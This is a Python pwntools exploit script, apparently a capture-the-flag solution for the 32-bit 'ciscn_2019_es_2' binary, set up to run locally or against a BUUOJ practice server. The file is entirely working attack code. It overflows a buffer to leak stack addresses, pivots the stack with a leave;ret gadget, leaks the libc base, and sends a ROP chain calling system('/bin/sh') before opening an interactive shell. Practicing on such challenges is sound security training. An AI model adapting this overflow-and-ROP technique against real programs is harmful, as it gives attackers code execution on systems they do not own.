#coding:utf-8

import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_es_2')
			#io=process(['./ciscn_2019_es_2'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./ciscn_2019_es_2')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26890)
			elf=ELF('ciscn_2019_es_2')
			libc=ELF('../../i386libc/libc.so.6')

		

		#gdb.attach(io,'b *0x080485b1')
		#pause()
		sleep(10)
		io.recv()
		rip=0x080485b1
		pay='a'*0x24
		io.send(pay)
		io.recv(0x2b)
		stack_addr1=u32(io.recv(4))
		stack_addr2=u32(io.recv()[:4])
		pay='a'*0x24+p32(stack_addr1)+p32(stack_addr2+0x18)+p32(rip)
		io.send(pay)
		io.recv()

		io.send('1'*0x14)
		io.recv(0x1b)
		libc_base=u32(io.recv()[:4])-libc.sym['__libc_start_main']-241
		libc.address=libc_base
		leave_ret=0x080485fd
		pay=p32(1)+p32(libc.sym['system'])+p32(1)+p32(libc.search('/bin/sh\x00').next())
		pay=pay.ljust(0x28,'\x00')
		pay+=p32(stack_addr2-0x10)+p32(leave_ret)
		io.send(pay)
		io.recv()		



		success('libc_base:'+hex(libc_base))
		io.interactive()
	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	pass